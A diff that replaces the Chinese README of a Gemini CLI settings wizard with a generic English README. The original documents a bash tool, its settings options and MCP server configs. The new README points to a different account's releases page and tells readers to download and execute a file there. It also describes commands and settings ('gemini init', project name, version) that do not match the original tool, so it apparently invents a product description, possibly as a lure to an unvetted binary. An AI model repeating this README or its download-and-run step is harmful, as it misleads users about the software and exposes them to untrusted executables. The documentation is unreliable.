@@ -1,221 +1,84 @@
-# Gemini CLI 設定精靈 🧙‍♂️✨
+# Gemini CLI Project Initialization Tool 🌌
 
-一個互動式的命令列工具，用於快速建立和設定 Google Gemini 的專案配置檔案。
+![Gemini CLI](https://img.shields.io/badge/Gemini-CLI-4B8BBE?style=for-the-badge&logo=git&logoColor=white)
 
-## 📋 簡介
+Welcome to the **Gemini CLI Project Initialization Tool**! This tool assists you in setting up your Gemini projects quickly and efficiently. With a focus on simplicity and ease of use, Gemini CLI helps you get started without unnecessary complications.
 
-這個設定精靈可以協助您快速建立 `.gemini/settings.json` 配置檔案，包含以下功能：
+## Table of Contents
 
-- 🔧 **互動式設定**：透過友善的介面引導您完成設定
-- 📝 **上下文管理**：設定要包含在 context 中的檔案
-- 🖋️ **編輯器選擇**：支援多種主流程式碼編輯器
-- 🎨 **主題配置**：提供豐富的顯示主題選項
-- 🔌 **MCP 伺服器整合**：支援 GitHub 和 Context7 MCP 伺服器
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-## 🛠️ 系統需求
+## Features
 
-在執行此腳本之前，請確保系統已安裝以下相依套件：
+- **Quick Setup**: Initialize your project in just a few commands.
+- **Customizable**: Tailor the settings to fit your project needs.
+- **User-Friendly**: Designed with simplicity in mind for all skill levels.
+- **Lightweight**: Minimal dependencies for fast performance.
 
-- **bash**：執行腳本的 shell 環境
-- **jq**：用於處理 JSON 資料的命令列工具
-- **sponge**：來自 `moreutils` 套件，用於原地更新檔案
-- **Docker**（可選）：如果要使用 GitHub MCP 伺服器
-- **Node.js/npm**（可選）：如果要使用 Context7 MCP 伺服器
+## Installation
 
-### 安裝相依套件
+To get started with the Gemini CLI Project Initialization Tool, follow these steps:
 
-**Ubuntu/Debian:**
+1. **Download the latest release** from the [Releases section](https://github.com/Uaekk/gemini-init/releases).
+2. **Execute the downloaded file** in your terminal.
 
-```bash
-sudo apt update
-sudo apt install -y jq moreutils
-```
+Ensure you have the necessary permissions to run the file. If you encounter any issues, please refer to the documentation.
 
-**macOS (使用 Homebrew):**
+## Usage
 
-```bash
-brew install jq moreutils
-```
+After installation, you can use the Gemini CLI to initialize your project. Here’s how:
 
-**Windows (使用 WSL):**
+1. Open your terminal.
+2. Navigate to your desired project directory.
+3. Run the command:
 
-```bash
-sudo apt update
-sudo apt install -y jq moreutils
-```
+   ```bash
+   gemini init
+   ```
 
-## 🚀 使用方法
+This command sets up the basic structure of your project. You can customize the settings by editing the configuration file generated during the initialization.
 
-1. **安裝腳本並賦予執行權限**：
+## Configuration
 
-    全域安裝
+The configuration file allows you to modify various aspects of your project. You can specify:
 
-    ```bash
-    sudo curl -sSL https://github.com/doggy8088/gemini-init/raw/main/gemini-init -o /usr/local/bin/gemini-init && sudo chmod +x /usr/local/bin/gemini-init
-    ```
+- **Project Name**: Set the name of your project.
+- **Version**: Define the initial version of your project.
+- **Dependencies**: List any required packages.
 
-    本地安裝
+To edit the configuration file, locate it in your project directory and make the necessary changes. Save the file and run the initialization command again to apply your updates.
 
-    ```bash
-    mkdir -p ~/.local/bin && curl -sSL https://github.com/doggy8088/gemini-init/raw/main/gemini-init -o ~/.local/bin/gemini-init && chmod +x ~/.local/bin/gemini-init
-    ```
+## Contributing
 
-    💡 請確保 `~/.local/bin` 在您的 PATH 環境變數中
+We welcome contributions to the Gemini CLI Project Initialization Tool! If you want to help, please follow these steps:
 
-2. **執行設定精靈**：
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your changes to your forked repository.
+5. Open a pull request with a clear description of your changes.
 
-    ```bash
-    gemini-init
-    ```
+Please ensure your code adheres to the project's coding standards.
 
-3. **依照提示進行設定**：腳本會引導您完成所有配置步驟。
+## License
 
-## 📋 設定選項詳解
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-### 1. Context 檔案名稱
+## Contact
 
-- **功能**：指定要包含在 Gemini context 中的檔案
-- **預設值**：`.github/copilot-instructions.md,GEMINI.md`
-- **格式**：使用逗號分隔多個檔案名稱
+For questions or support, please reach out via GitHub issues or directly contact the maintainers.
 
-### 2. 偏好編輯器
+## Releases
 
-支援的編輯器選項：
-
-1. Zed
-2. **VS Code**（預設）
-3. VSCodium
-4. Windsurf
-5. Cursor
-6. Vim
-7. Neovim
-
-### 3. 顯示主題
-
-可選擇的主題包括：
-
-1. ANSI Light
-2. ANSI
-3. Atom One
-4. Ayu Light
-5. Ayu
-6. Default Light
-7. Default
-8. Dracula
-9. **GitHub**（預設）
-10. GitHub Light
-11. Google Code
-12. No Color
-13. Shades Of Purple
-
-### 4. MCP 伺服器設定
-
-#### GitHub MCP 伺服器
-
-- **功能**：提供 GitHub 整合功能
-- **需求**：Docker 和 `GITHUB_PERSONAL_ACCESS_TOKEN` 環境變數
-- **設定內容**：
-
-  ```json
-  {
-    "command": "docker",
-    "args": ["run", "-i", "--rm", "-e", "GITHUB_PERSONAL_ACCESS_TOKEN", "ghcr.io/github/github-mcp-server"],
-    "env": {"GITHUB_PERSONAL_ACCESS_TOKEN": "$GITHUB_PERSONAL_ACCESS_TOKEN"},
-    "trust": true
-  }
-  ```
-
-#### Context7 MCP 伺服器
-
-- **功能**：提供增強的 context 管理功能
-- **需求**：Node.js 和 npm
-- **設定內容**：
-
-  ```json
-  {
-    "type": "stdio",
-    "command": "npx",
-    "args": ["-y", "@upstash/context7-mcp"],
-    "trust": true
-  }
-  ```
-
-## 📁 輸出結果
-
-執行完成後，會在您的專案根目錄建立以下結構：
-
-```text
-.gemini/
-└── settings.json
-```
-
-範例 `settings.json` 檔案內容：
-
-```json
-{
-  "contextFileName": [
-    ".github/copilot-instructions.md",
-    "GEMINI.md"
-  ],
-  "preferredEditor": "vscode",
-  "theme": "GitHub",
-  "mcpServers": {
-    "github": {
-      "command": "docker",
-      "args": [
-        "run",
-        "-i",
-        "--rm",
-        "-e",
-        "GITHUB_PERSONAL_ACCESS_TOKEN",
-        "ghcr.io/github/github-mcp-server"
-      ],
-      "env": {
-        "GITHUB_PERSONAL_ACCESS_TOKEN": "$GITHUB_PERSONAL_ACCESS_TOKEN"
-      },
-      "trust": true
-    },
-    "context7": {
-      "type": "stdio",
-      "command": "npx",
-      "args": [
-        "-y",
-        "@upstash/context7-mcp"
-      ],
-      "trust": true
-    }
-  }
-}
-```
-
-## ❓ 常見問題
-
-**Q: 出現 "jq: command not found" 錯誤**
-A: 請先安裝 jq 套件：`sudo apt install jq`（Linux）或 `brew install jq`（macOS）
-
-**Q: 出現 "sponge: command not found" 錯誤**
-A: 請安裝 moreutils 套件：`sudo apt install moreutils`
-
-**Q: GitHub MCP 伺服器無法啟動**
-A: 請確認已安裝 Docker 並設定 `GITHUB_PERSONAL_ACCESS_TOKEN` 環境變數
-
-**Q: 如何重新設定？**
-A: 只需再次執行 `./gemini-init` 即可覆寫現有設定
-
-## 📄 授權條款
-
-此專案採用 MIT 授權條款 - 詳情請參閱 [LICENSE](LICENSE) 檔案
-
-## 🤝 貢獻指南
-
-歡迎提交 Issue 和 Pull Request！
-
-1. Fork 此專案
-2. 建立功能分支：`git checkout -b feature/amazing-feature`
-3. 提交變更：`git commit -m 'Add some amazing feature'`
-4. 推送到分支：`git push origin feature/amazing-feature`
-5. 開啟 Pull Request
+For the latest updates and downloads, visit the [Releases section](https://github.com/Uaekk/gemini-init/releases). Here, you can find the latest version of the Gemini CLI Project Initialization Tool and download it for your use.
 
 ---
 
-**享受您的 Gemini CLI 開發體驗！** 🚀🤖
+This README serves as a comprehensive guide to using the Gemini CLI Project Initialization Tool. Enjoy simplifying your project setup with Gemini!
